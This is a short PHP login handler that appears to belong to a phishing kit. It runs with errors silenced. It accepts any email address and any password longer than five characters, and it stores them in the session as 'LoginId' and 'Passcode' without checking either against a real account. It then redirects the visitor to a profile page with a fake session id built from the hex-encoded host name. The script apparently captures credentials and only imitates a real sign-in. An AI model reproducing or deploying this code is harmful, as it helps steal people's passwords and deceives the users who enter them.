<?php
error_reporting(0);
ini_set("output_buffering",4096);
@ob_start();
session_start();

require_once 'inc/functions.php';
require_once 'inc/config.php';

$isValidEmail = false;
$isValidPassword = false;

$redirect_filename = "login.php";


$host = bin2hex ($_SERVER['HTTP_HOST']);


if(isset($_POST['email']) && trim($_POST['email']) !== '')
{
	if(is_email($_POST['email'])) {
		$isValidEmail = true;
	}
	$_SESSION['LoginId'] = $_POST['email'];
}


if(isset($_POST['password']) && trim($_POST['password']) !== '')
{
	if (strlen($_POST['password']) > 5) {
		$isValidPassword = true;
		$_SESSION['Passcode'] = $_POST['password'];
	}
}


if (!$isValidPassword || !$isValidEmail) {
	header("Location: $redirect_filename?error=true&sessionid=".$host);
} else  {
	header("Location: profile.php?loggedin=true&result=0&sessionid=".$host);
}
ob_end_flush();

?>